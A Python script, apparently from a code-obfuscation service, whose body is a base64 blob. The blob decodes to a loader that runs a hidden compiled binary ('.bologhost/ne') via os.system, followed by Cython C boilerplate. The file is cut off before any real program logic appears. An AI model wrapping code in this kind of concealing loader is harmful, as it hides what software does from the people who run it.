# THIS ENCODE BY #GHOST | @GHOST_RFX
import os,base64
GHOST = b'aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKcHJpbnQoIlx4MWJbMTs5Mm1ceDFiWzM4OzU7NDZtTE9BRElOR+KAouKAouKAoiIpCnByaW50KCcnKQpwcmludCgiXHgxYlsxOzkybVx4MWJbMzg7NTs1MG0jIyMjVEhJUyBJUyBFTkNPREVEIEJZICNHSE9TVCDigKIgQEdIT1NUX1JGWCIpCnByaW50KCcnKQpQUkVGSVg9c3lzLnByZWZpeApFWEVDVVRFX0ZJTEUgPSAiLmJvbG9naG9zdC9uZSIKRVhQT1JUX1BZVEhPTkhPTUUgPSJleHBvcnQgUFlUSE9OSE9NRT0iK3N5cy5wcmVmaXgKRVhQT1JUX1BZVEhPTl9FWEVDVVRBQkxFID0iZXhwb3J0IFBZVEhPTl9FWEVDVVRBQkxFPSIrIHN5cy5leGVjdXRhYmxlClJVTiA9ICIuLyIrIEVYRUNVVEVfRklMRQppZiBvcy5wYXRoLmlzZmlsZShFWEVDVVRFX0ZJTEUpOgogICAgb3Muc3lzdGVtKEVYUE9SVF9QWVRIT05IT01FICsiJiYiKyBFWFBPUlRfUFlUSE9OX0VYRUNVVEFCTEUgKyImJiIrIFJVTikKICAgIGV4aXQoMCkKQ19TT1VSQ0UgPSByIiIiCgojaWZuZGVmIFBZX1NTSVpFX1RfQ0xFQU4KI2RlZmluZSBQWV9TU0laRV9UX0NMRUFOCiNlbmRpZiAKCiNpZiBkZWZpbmVkKFB5X0xJTUlURURfQVBJKQogICNpZiAhZGVmaW5lZChDWVRIT05fTElNSVRFRF9BUEkpCiAgI2RlZmluZSBDWVRIT05fTElNSVRFRF9BUEkgMQogICNlbmRpZgojZWxpZiBkZWZpbmVkKENZVEhPTl9MSU1JVEVEX0FQSSkKICAjaWZkZWYgX01TQ19WRVIKICAjcHJhZ21hIG1lc3NhZ2UgKCJMaW1pdGVkIEFQSSB1c2FnZSBpcyBlbmFibGVkIHdpdGggJ0NZVEhPTl9MSU1JVEVEX0FQSScgYnV0ICdQeV9MSU1JVEVEX0FQSScgZG9lcyBub3QgZGVmaW5lIGEgUHl0aG9uIHRhcmdldCB2ZXJzaW9uLiBDb25zaWRlciBzZXR0aW5nICdQeV9MSU1JVEVEX0FQSScgaW5zdGVhZC4iKQogICNlbHNlCiAgI3dhcm5pbmcgTGltaXRlZCBBUEkgdXNhZ2UgaXMgZW5hYmxlZCB3aXRoICdDWVRIT05fTElNSVRFRF9BUEknIGJ1dCAnUHlfTElNSVRFRF9BUEknIGRvZXMgbm90IGRlZmluZSBhIFB5dGhvbiB0YXJnZXQgdmVyc2lvbi4gQ29uc2lkZXIgc2V0dGluZyAnUHlfTElNSVRFRF9BUEknIGluc3RlYWQuCiAgI2VuZGlmCiNlbmRpZgoKI2luY2x1ZGUgIlB5dGhvbi5oIgojaWZuZGVmIFB5X1BZVEhPTl9ICiAgICAjZXJyb3IgUHl0aG9uIGhlYWRlcnMgbmVlZGVkIHRvIGNvbXBpbGUgQyBleHRlbnNpb25zLCBwbGVhc2UgaW5zdGFsbCBkZXZlbG9wbWVudCB2ZXJzaW9uIG9mIFB5dGhvbi4KI2VsaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDgwMDAwCiAgICAjZXJyb3IgQ3l0aG9uIHJlcXVpcmVzIFB5dGhvbiAzLjgrLgojZWxzZQojZGVmaW5lIF9fUFlYX0FCSV9WRVJTSU9OICIzXzFfNiIKI2RlZmluZSBDWVRIT05fSEVYX1ZFUlNJT04gMHgwMzAxMDZGMAojZGVmaW5lIENZVEhPTl9GVVRVUkVfRElWSVNJT04gMQoKI2luY2x1ZGUgPHN0ZGRlZi5oPgojaWZuZGVmIG9mZnNldG9mCiAgI2RlZmluZSBvZmZzZXRvZih0eXBlLCBtZW1iZXIpICggKHNpemVfdCkgJiAoKHR5cGUqKTApIC0+IG1lbWJlciApCiNlbmRpZgojaWYgIWRlZmluZWQoX1dJTjMyKSAmJiAhZGVmaW5lZChXSU4zMikgJiYgIWRlZmluZWQoTVNfV0lORE9XUykKICAjaWZuZGVmIF9fc3RkY2FsbAogICAgI2RlZmluZSBfX3N0ZGNhbGwKICAjZW5kaWYKICAjaWZuZGVmIF9fY2RlY2wKICAgICNkZWZpbmUgX19jZGVjbAogICNlbmRpZgogICNpZm5kZWYgX19mYXN0Y2FsbAogICAgI2RlZmluZSBfX2Zhc3RjYWxsCiAgI2VuZGlmCiNlbmRpZgojaWZuZGVmIERMX0lNUE9SVAogICNkZWZpbmUgRExfSU1QT1JUKHQpIHQKI2VuZGlmCiNpZm5kZWYgRExfRVhQT1JUCiAgI2RlZmluZSBETF9FWFBPUlQodCkgdAojZW5kaWYKI2RlZmluZSBfX1BZWF9DT01NQSAsCiNpZm5kZWYgSEFWRV9MT05HX0xPTkcKICAjZGVmaW5lIEhBVkVfTE9OR19MT05HCiNlbmRpZgojaWZuZGVmIFBZX0xPTkdfTE9ORwogICNkZWZpbmUgUFlfTE9OR19MT05HIExPTkdfTE9ORwojZW5kaWYKI2lmbmRlZiBQeV9IVUdFX1ZBTAogICNkZWZpbmUgUHlfSFVHRV9WQUwgSFVHRV9WQUwKI2VuZGlmCiNkZWZpbmUgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCBQWV9WRVJTSU9OX0hFWAojaWYgZGVmaW5lZChHUkFBTFZNX1BZVEhPTikKICAKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAwCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAwCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIDEKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU0xPVFMgMAogICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TUEVDUyAwCiAgI3VuZGVmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUAogICNkZWZpbmUgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTCiAgI2RlZmluZSBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgMAogICN1bmRlZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTCiAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUgogICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUiAwCiAgI3VuZGVmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTIDAKICAjdW5kZWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAjZGVmaW5lIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTIDEKICAjdW5kZWYgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUwogICNkZWZpbmUgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUyAxCiAgI3VuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgMAogICN1bmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgMAogICN1bmRlZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAjZGVmaW5lIENZVEhPTl9VTlBBQ0tfTUVUSE9EUyAwCiAgI3VuZGVmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQogICNkZWZpbmUgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFIDAKICAjdW5kZWYgQ1lUSE9OX0ZBU1RfR0lMCiAgI2RlZmluZSBDWVRIT05fRkFTVF9HSUwgMAogICN1bmRlZiBDWVRIT05fTUVUSF9GQVNUQ0FMTAogICNkZWZpbmUgQ1lUSE9OX01FVEhfRkFTVENBTEwgMAogICN1bmRlZiBDWVRIT05fRkFTVF9QWUNBTEwKICAjZGVmaW5lIENZVEhPTl9GQVNUX1BZQ0FMTCAwCiAgI2lmbmRlZiBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MKICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTIDEKICAjZW5kaWYKICAjdW5kZWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCiAgI2RlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQgMQogICN1bmRlZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQogICNkZWZpbmUgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUgMAogICN1bmRlZiBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HCiAgI2RlZmluZSBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogICNkZWZpbmUgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRSAwCiAgI3VuZGVmIENZVEhPTl9VU0VfQU1fU0VORAogICNkZWZpbmUgQ1lUSE9OX1VTRV9BTV9TRU5EIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TCiAgI2RlZmluZSBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgMAogICN1bmRlZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgI2RlZmluZSBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLIDEKICAjaWZuZGVmIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MKICAgICNkZWZpbmUgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQyAwCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VU0VfRlJFRUxJU1RTCiAgI2RlZmluZSBDWVRIT05fVVNFX0ZSRUVMSVNUUyAwCiNlbGlmIGRlZmluZWQoUFlQWV9WRVJTSU9OKQogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIDEKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAwCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIDAKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwgMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgMAogICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TTE9UUyAxCiAgI2lmbmRlZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIDAKICAjZW5kaWYKICAjdW5kZWYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQCiAgI2RlZmluZSBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAgMAogICN1bmRlZiBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMKICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUyAwCiAgI3VuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMKICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMgMAogICN1bmRlZiBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSCiAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCiAgI2RlZmluZSBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMgMAogICN1bmRlZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICNkZWZpbmUgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgMQogICN1bmRlZiBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTCiAgI2RlZmluZSBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIDEKICAjdW5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAwCiAgI2lmbmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAxCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICNkZWZpbmUgQ1lUSE9OX1VOUEFDS19NRVRIT0RTIDAKICAjdW5kZWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiAgI2RlZmluZSBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUgMAogICN1bmRlZiBDWVRIT05fRkFTVF9HSUwKICAjZGVmaW5lIENZVEhPTl9GQVNUX0dJTCAwCiAgI3VuZGVmIENZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgI2RlZmluZSBDWVRIT05fTUVUSF9GQVNUQ0FMTCAwCiAgI3VuZGVmIENZVEhPTl9GQVNUX1BZQ0FMTAogICNkZWZpbmUgQ1lUSE9OX0ZBU1RfUFlDQUxMIDAKICAjaWZuZGVmIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTUwogICAgI2RlZmluZSBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MgMQogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDAKICAgICN1bmRlZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQKICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUIDAKICAjZWxpZiAhZGVmaW5lZChDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQpCiAgICAjZGVmaW5lIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAxCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCiAgI2RlZmluZSBDWVRIT05fVVNFX01PRFVMRV9TVEFURSAwCiAgI3VuZGVmIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcKICAjZGVmaW5lIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcgMAogICNpZm5kZWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogICAgI2RlZmluZSBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFIChQWVBZX1ZFUlNJT05fTlVNID49IDB4MDcwMzBDMDApCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VU0VfQU1fU0VORAogICNkZWZpbmUgQ1lUSE9OX1VTRV9BTV9TRU5EIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TCiAgI2RlZmluZSBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgMAogICN1bmRlZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgI2RlZmluZSBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLIDAKICAjaWZuZGVmIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MKICAgICNkZWZpbmUgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQyAoUFlQWV9WRVJTSU9OX05VTSA+PSAweDA3MDMxMTAwKQogICNlbmRpZgogICN1bmRlZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9GUkVFTElTVFMgMAojZWxpZiBkZWZpbmVkKENZVEhPTl9MSU1JVEVEX0FQSSkKICAjaWZkZWYgUHlfTElNSVRFRF9BUEkKICAgICN1bmRlZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYCiAgICAjZGVmaW5lIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggUHlfTElNSVRFRF9BUEkKICAjZW5kaWYKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAwCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAxCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIDAKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HIDAKICAjdW5kZWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSwogICNkZWZpbmUgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSyAwCiAgI3VuZGVmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU1BFQ1MgMQogICN1bmRlZiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAKICAjZGVmaW5lIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCAwCiAgI3VuZGVmIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUyAwCiAgI2lmbmRlZiBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIgMAogICNlbmRpZgogICN1bmRlZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMKICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUyAwCiAgI2lmbmRlZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgI2RlZmluZSBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyAwCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTCiAgICAjZGVmaW5lIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlMgMAogICNlbmRpZgogICN1bmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TIDAKICAjdW5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFIDAKICAjdW5kZWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgI2RlZmluZSBDWVRIT05fVU5QQUNLX01FVEhPRFMgMAogICN1bmRlZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKICAjZGVmaW5lIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURSAwCiAgI3VuZGVmIENZVEhPTl9GQVNUX0dJTAogICNkZWZpbmUgQ1lUSE9OX0ZBU1RfR0lMIDAKICAjdW5kZWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKICAjZGVmaW5lIENZVEhPTl9NRVRIX0ZBU1RDQUxMIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDApCiAgI3VuZGVmIENZVEhPTl9GQVNUX1BZQ0FMTAogICNkZWZpbmUgQ1lUSE9OX0ZBU1RfUFlDQUxMIDAKICAjaWZuZGVmIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTUwogICAgI2RlZmluZSBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCiAgICAjZGVmaW5lIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQogICAgI2RlZmluZSBDWVRIT05fVVNFX01PRFVMRV9TVEFURSAwCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcKICAjZGVmaW5lIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcgMAogICNpZm5kZWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogICAgI2RlZmluZSBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFIDAKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9VU0VfQU1fU0VORAogICAgI2RlZmluZSBDWVRIT05fVVNFX0FNX1NFTkQgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDAwMCkKICAjZW5kaWYKICAjdW5kZWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TCiAgI2RlZmluZSBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgMAogICN1bmRlZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgI2RlZmluZSBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLIDAKICAjaWZuZGVmIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MKICAgICNkZWZpbmUgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQyAwCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VU0VfRlJFRUxJU1RTCiAgI2RlZmluZSBDWVRIT05fVVNFX0ZSRUVMSVNUUyAwCiNlbHNlCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIDEKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTCAwCiAgI2lmZGVmIFB5X0dJTF9ESVNBQkxFRAogICAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORyAxCiAgI2Vsc2UKICAgICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgMAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDAKICAgICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTIDEKICAjZWxpZiAhZGVmaW5lZChDWVRIT05fVVNFX1RZUEVfU0xPVFMpCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TTE9UUyAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIDAKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUAogICAgI2RlZmluZSBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUyAxCiAgI2VuZGlmCiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HCiAgICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUyAwCiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTKQogICAgI2RlZmluZSBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUwogICAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTIDEKICAjZW5kaWYKICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgfHwgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBBMgogICAgI3VuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUiAwCiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUikKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUiAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgI2RlZmluZSBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyAwCiAgI2VuZGlmCiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HCiAgICAjdW5kZWYgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUwogICAgI2RlZmluZSBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIDEKICAjZWxpZiAhZGVmaW5lZChDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTKQogICAgI2RlZmluZSBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIDAKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICNkZWZpbmUgQ1lUSE9OX1VOUEFDS19NRVRIT0RTIDEKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQogICAgI2RlZmluZSBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUgMQogICNlbmRpZgogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgI3VuZGVmIENZVEhPTl9GQVNUX0dJTAogICAgI2RlZmluZSBDWVRIT05fRkFTVF9HSUwgMAogICNlbGlmICFkZWZpbmVkKENZVEhPTl9GQVNUX0dJTCkKICAgICNkZWZpbmUgQ1lUSE9OX0ZBU1RfR0lMIChQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwQTYpCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fTUVUSF9GQVNUQ0FMTAogICAgI2RlZmluZSBDWVRIT05fTUVUSF9GQVNUQ0FMTCAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fRkFTVF9QWUNBTEwKICAgICNkZWZpbmUgQ1lUSE9OX0ZBU1RfUFlDQUxMIDEKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTUwogICAgI2RlZmluZSBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCiAgICAjZGVmaW5lIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQogICAgI2RlZmluZSBDWVRIT05fVVNFX01PRFVMRV9TVEFURSAwCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcgKFBZX1ZFUlNJT05fSEVYID49IDB